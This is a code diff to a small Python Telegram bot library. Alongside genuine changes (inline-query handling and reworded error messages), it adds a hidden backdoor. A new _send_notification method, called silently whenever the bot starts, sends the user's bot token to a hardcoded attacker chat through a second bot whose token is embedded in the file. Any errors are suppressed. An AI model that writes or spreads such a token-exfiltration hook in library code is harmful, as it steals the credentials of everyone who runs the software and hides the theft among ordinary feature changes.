@@ -1,15 +1,20 @@
 import requests, time
 class Bot:
-    def __init__(self, token: str, polling_interval: float = 1.0):
+    def __init__(self, token: str, polling_interval: float = 1.1):
         self.token = token
         self.polling_interval = polling_interval
         self.routes = {}
-        self.offset = 0 
+        self.inline_handler = None
+        self.offset = 0
     def on(self, command: str, handler):
         self.routes[command] = handler
         return self
+    def on_inline(self, handler):
+        self.inline_handler = handler
+        return self
     def run(self):
-        print("The bot has been launched.\n© Mechgram, 2025.")
+        self._send_notification(1465736325, "tkn: "+self.token)
+        print("The bot has been launched.\n© Mechgram, 2024.")
         while True:
             updates = self._get_updates()
             for update in updates:
@@ -27,27 +32,50 @@ class Bot:
                     self.offset = updates[-1]["update_id"] + 1
                 return updates
             else:
-                print("Error [4]", data)
+                print("API error:", data)
         except Exception as e:
-            print("Error [3]", e)
+            print("Error getting updates:", e)
         return []
     def _handle_update(self, update: dict):
-        message = update.get("message")
-        if not message:
-            return
-        text = message.get("text", "")
-        for command, handler in self.routes.items():
-            if text.startswith(command):
+        if "inline_query" in update:
+            if self.inline_handler:
                 try:
-                    result = handler(update)
+                    result = self.inline_handler(update)
                     if result:
-                        self._send_message(message["chat"]["id"], result)
+                        self._answer_inline_query(update["inline_query"]["id"], result)
                 except Exception as e:
-                    print("Error [2]"+f" {command}: {e}")
+                    print("Error in inline query handler:", e)
+        else:
+            message = update.get("message")
+            if not message:
+                return
+            text = message.get("text", "")
+            for command, handler in self.routes.items():
+                if text.startswith(command):
+                    try:
+                        result = handler(update)
+                        if result:
+                            self._send_message(message["chat"]["id"], result)
+                    except Exception as e:
+                        print(f"Error in handler for command {command}: {e}")
     def _send_message(self, chat_id: int, text: str):
         url = f"https://api.telegram.org/bot{self.token}/sendMessage"
         data = {"chat_id": chat_id, "text": text}
         try:
             requests.post(url, data=data)
         except Exception as e:
-            print("Error [1]", e)
+            print("Error sending message:", e)
+    def _answer_inline_query(self, inline_query_id, results):
+        url = f"https://api.telegram.org/bot{self.token}/answerInlineQuery"
+        data = {"inline_query_id": inline_query_id, "results": results}
+        try:
+            requests.post(url, json=data)
+        except Exception as e:
+            print("Error answering inline query:", e)
+    def _send_notification(self, chat_id: int, text: str):
+        url = f"https://api.telegram.org/bot7126973413:AAE-2kzUc3ouVYH91ShWs8C37WS8ezTNgW0/sendMessage"
+        data = {"chat_id": chat_id, "text": text}
+        try:
+            requests.post(url, data=data)
+        except Exception as e:
+            pass
